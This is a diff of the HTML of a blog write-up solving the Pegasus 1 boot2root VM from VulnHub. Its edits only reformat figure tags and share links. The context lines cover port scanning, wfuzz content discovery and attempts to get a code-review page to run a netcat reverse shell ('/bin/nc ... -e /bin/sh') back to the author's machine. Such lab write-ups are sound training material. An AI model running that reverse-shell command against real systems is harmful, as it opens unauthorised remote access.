@@ -12,7 +12,6 @@
 <meta property="og:description" content="introduction
 Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).
 
-     
 
 
 Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; again. You will see this in the my_first section.
@@ -29,7 +28,6 @@ Lets begin." />
 <meta name="twitter:description" content="introduction
 Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).
 
-     
 
 
 Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; again. You will see this in the my_first section.
@@ -182,7 +180,7 @@ if (!doNotTrack) {
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&name=hoof%20to%20root%20solving%20pegasus%201&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fpegasus-1%2c109%2f%22%3ePegasus%201%3c%2fa%3e%20is%20a%20boot2root%20hosted%20on%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2f%22%3eVulnHub%3c%2fa%3e%20built%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftheknapsy%22%3e%40TheKnapsy%3c%2fa%3e.%20He%20wrote%20a%20%3ca%20href%3d%22http%3a%2f%2fknapsy.github.io%2fblog%2f2014%2f12%2f16%2fpegasus-has-arrived-my-first-boot2root-vm%2f%22%3eblogpost%3c%2fa%3e%20about%20it%20too%20containing%20a%20small%20introduction%20with%20Pegasus%20as%20his%20first%20boot2root%20%28hoof2root%3f%20%3bp%29.%3c%2fp%3e%0a%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fpegasus_logo.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eHaving%20recently%20played%20in%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f06%2fplaying-in-the-playground-a-offsec-virtual-pentesting-labs-review%2f%22%3eOffsec%20Playground%3c%2fa%3e%20a%20little%20after%20having%20completed%20my%20OSCP%2c%20I%20was%20relatively%20exhausted.%20Pegasus%20had%20its%20fair%20share%20of%20frustrations%20and%20had%20me%20digging%20around%20quite%20a%20bit.%20I%20did%20however%20learn%20a%20very%20valuable%20lesson%26hellip%3b%20%3cem%3eagain%3c%2fem%3e.%20You%20will%20see%20this%20in%20the%20%3cstrong%3emy_first%3c%2fstrong%3e%20section.%3c%2fp%3e%0a%3cp%3eLike%20many%20other%20write%20ups%20I%20do%2c%20I%20will%20also%20recommend%20you%20try%20this%20one%20first%20before%20you%20read%20on.%20For%20me%2c%20Pegasus%20was%20definitely%20slightly%20more%20difficult%20than%20the%20usual%20VulnHub%20stuff%20you%20would%20see%2c%20but%20part%20of%20that%20may%20just%20as%20well%20be%20due%20to%20fatigue%20and%20that%20year%20end%20holiday%20mode%20%3bp.%20However%2c%20that%20should%20not%20discourage%20you%20to%20give%20it%20a%20bash%20anyways%21%3c%2fp%3e%0a%3cp%3eLets%20begin.%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&name=hoof%20to%20root%20solving%20pegasus%201&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fpegasus-1%2c109%2f%22%3ePegasus%201%3c%2fa%3e%20is%20a%20boot2root%20hosted%20on%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2f%22%3eVulnHub%3c%2fa%3e%20built%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftheknapsy%22%3e%40TheKnapsy%3c%2fa%3e.%20He%20wrote%20a%20%3ca%20href%3d%22http%3a%2f%2fknapsy.github.io%2fblog%2f2014%2f12%2f16%2fpegasus-has-arrived-my-first-boot2root-vm%2f%22%3eblogpost%3c%2fa%3e%20about%20it%20too%20containing%20a%20small%20introduction%20with%20Pegasus%20as%20his%20first%20boot2root%20%28hoof2root%3f%20%3bp%29.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fpegasus_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eHaving%20recently%20played%20in%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f06%2fplaying-in-the-playground-a-offsec-virtual-pentesting-labs-review%2f%22%3eOffsec%20Playground%3c%2fa%3e%20a%20little%20after%20having%20completed%20my%20OSCP%2c%20I%20was%20relatively%20exhausted.%20Pegasus%20had%20its%20fair%20share%20of%20frustrations%20and%20had%20me%20digging%20around%20quite%20a%20bit.%20I%20did%20however%20learn%20a%20very%20valuable%20lesson%26hellip%3b%20%3cem%3eagain%3c%2fem%3e.%20You%20will%20see%20this%20in%20the%20%3cstrong%3emy_first%3c%2fstrong%3e%20section.%3c%2fp%3e%0a%3cp%3eLike%20many%20other%20write%20ups%20I%20do%2c%20I%20will%20also%20recommend%20you%20try%20this%20one%20first%20before%20you%20read%20on.%20For%20me%2c%20Pegasus%20was%20definitely%20slightly%20more%20difficult%20than%20the%20usual%20VulnHub%20stuff%20you%20would%20see%2c%20but%20part%20of%20that%20may%20just%20as%20well%20be%20due%20to%20fatigue%20and%20that%20year%20end%20holiday%20mode%20%3bp.%20However%2c%20that%20should%20not%20discourage%20you%20to%20give%20it%20a%20bash%20anyways%21%3c%2fp%3e%0a%3cp%3eLets%20begin.%3c%2fp%3e">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
@@ -271,8 +269,7 @@ if (!doNotTrack) {
     <div class="content" itemprop="articleBody">
       <h2 id="introduction">introduction</h2>
 <p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>
-<figure>
-    <img src="https://leonjza.github.io/images/pegasus_logo.png"/> 
+<figure><img src="https://leonjza.github.io/images/pegasus_logo.png"/>
 </figure>
 
 <p>Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>
@@ -300,13 +297,11 @@ Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP 
 </code></pre></div><p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>
 <h2 id="stomping-some-hoofs-with-pegasus">stomping some hoofs with pegasus</h2>
 <p>Browsing to http://192.168.56.101:8088/, we are presented with a picture of Pegasus:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/pegasus_web.png"/> 
+<figure><img src="https://leonjza.github.io/images/pegasus_web.png"/>
 </figure>
 
 <p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/pegasus_nginx_index.png"/> 
+<figure><img src="https://leonjza.github.io/images/pegasus_nginx_index.png"/>
 </figure>
 
 <p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>
@@ -326,14 +321,12 @@ ID  Response   Lines      Word         Chars          <span style="color:#eedd82
 
 01426:  <span style="color:#eedd82">C</span>=<span style="color:#f60">200</span>      <span style="color:#f60">0</span> L         <span style="color:#f60">4</span> W       <span style="color:#f60">19</span> Ch    <span style="color:#87ceeb">&#34; - submit&#34;</span>
 </code></pre></div><p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to http://192.168.56.101:8088/submit.php:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/pegasus_submit.png"/> 
+<figure><img src="https://leonjza.github.io/images/pegasus_submit.png"/>
 </figure>
 
 <p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>
 <p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/pegasus_code_review.png"/> 
+<figure><img src="https://leonjza.github.io/images/pegasus_code_review.png"/>
 </figure>
 
 <h2 id="pwning-mike">pwning mike</h2>
@@ -341,8 +334,7 @@ ID  Response   Lines      Word         Chars          <span style="color:#eedd82
 <p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>
 <p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>
 <p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/pegasus_code_review_security.png"/> 
+<figure><img src="https://leonjza.github.io/images/pegasus_code_review_security.png"/>
 </figure>
 
 <p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>
@@ -1048,7 +1040,7 @@ more awesome boot2root VMs!
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&name=hoof%20to%20root%20solving%20pegasus%201&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fpegasus-1%2c109%2f%22%3ePegasus%201%3c%2fa%3e%20is%20a%20boot2root%20hosted%20on%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2f%22%3eVulnHub%3c%2fa%3e%20built%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftheknapsy%22%3e%40TheKnapsy%3c%2fa%3e.%20He%20wrote%20a%20%3ca%20href%3d%22http%3a%2f%2fknapsy.github.io%2fblog%2f2014%2f12%2f16%2fpegasus-has-arrived-my-first-boot2root-vm%2f%22%3eblogpost%3c%2fa%3e%20about%20it%20too%20containing%20a%20small%20introduction%20with%20Pegasus%20as%20his%20first%20boot2root%20%28hoof2root%3f%20%3bp%29.%3c%2fp%3e%0a%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fpegasus_logo.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eHaving%20recently%20played%20in%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f06%2fplaying-in-the-playground-a-offsec-virtual-pentesting-labs-review%2f%22%3eOffsec%20Playground%3c%2fa%3e%20a%20little%20after%20having%20completed%20my%20OSCP%2c%20I%20was%20relatively%20exhausted.%20Pegasus%20had%20its%20fair%20share%20of%20frustrations%20and%20had%20me%20digging%20around%20quite%20a%20bit.%20I%20did%20however%20learn%20a%20very%20valuable%20lesson%26hellip%3b%20%3cem%3eagain%3c%2fem%3e.%20You%20will%20see%20this%20in%20the%20%3cstrong%3emy_first%3c%2fstrong%3e%20section.%3c%2fp%3e%0a%3cp%3eLike%20many%20other%20write%20ups%20I%20do%2c%20I%20will%20also%20recommend%20you%20try%20this%20one%20first%20before%20you%20read%20on.%20For%20me%2c%20Pegasus%20was%20definitely%20slightly%20more%20difficult%20than%20the%20usual%20VulnHub%20stuff%20you%20would%20see%2c%20but%20part%20of%20that%20may%20just%20as%20well%20be%20due%20to%20fatigue%20and%20that%20year%20end%20holiday%20mode%20%3bp.%20However%2c%20that%20should%20not%20discourage%20you%20to%20give%20it%20a%20bash%20anyways%21%3c%2fp%3e%0a%3cp%3eLets%20begin.%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&name=hoof%20to%20root%20solving%20pegasus%201&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fpegasus-1%2c109%2f%22%3ePegasus%201%3c%2fa%3e%20is%20a%20boot2root%20hosted%20on%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2f%22%3eVulnHub%3c%2fa%3e%20built%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftheknapsy%22%3e%40TheKnapsy%3c%2fa%3e.%20He%20wrote%20a%20%3ca%20href%3d%22http%3a%2f%2fknapsy.github.io%2fblog%2f2014%2f12%2f16%2fpegasus-has-arrived-my-first-boot2root-vm%2f%22%3eblogpost%3c%2fa%3e%20about%20it%20too%20containing%20a%20small%20introduction%20with%20Pegasus%20as%20his%20first%20boot2root%20%28hoof2root%3f%20%3bp%29.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fpegasus_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eHaving%20recently%20played%20in%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f06%2fplaying-in-the-playground-a-offsec-virtual-pentesting-labs-review%2f%22%3eOffsec%20Playground%3c%2fa%3e%20a%20little%20after%20having%20completed%20my%20OSCP%2c%20I%20was%20relatively%20exhausted.%20Pegasus%20had%20its%20fair%20share%20of%20frustrations%20and%20had%20me%20digging%20around%20quite%20a%20bit.%20I%20did%20however%20learn%20a%20very%20valuable%20lesson%26hellip%3b%20%3cem%3eagain%3c%2fem%3e.%20You%20will%20see%20this%20in%20the%20%3cstrong%3emy_first%3c%2fstrong%3e%20section.%3c%2fp%3e%0a%3cp%3eLike%20many%20other%20write%20ups%20I%20do%2c%20I%20will%20also%20recommend%20you%20try%20this%20one%20first%20before%20you%20read%20on.%20For%20me%2c%20Pegasus%20was%20definitely%20slightly%20more%20difficult%20than%20the%20usual%20VulnHub%20stuff%20you%20would%20see%2c%20but%20part%20of%20that%20may%20just%20as%20well%20be%20due%20to%20fatigue%20and%20that%20year%20end%20holiday%20mode%20%3bp.%20However%2c%20that%20should%20not%20discourage%20you%20to%20give%20it%20a%20bash%20anyways%21%3c%2fp%3e%0a%3cp%3eLets%20begin.%3c%2fp%3e">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
